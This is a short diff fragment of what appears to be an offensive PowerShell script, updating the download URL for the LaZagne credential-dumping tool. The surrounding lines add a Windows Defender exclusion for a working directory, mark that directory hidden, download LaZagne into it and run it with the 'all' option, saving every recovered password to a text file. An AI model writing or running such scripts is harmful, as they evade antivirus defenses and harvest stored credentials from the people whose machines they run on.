@@ -90,7 +90,7 @@ Add-MpPreference -ExclusionPath $dir
 $hide = Get-Item $dir -Force
 $hide.attributes='Hidden'
 # Download the executable
-Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
+Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$dir\lazagne.exe"
 # Execute the executable and save output to a file
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
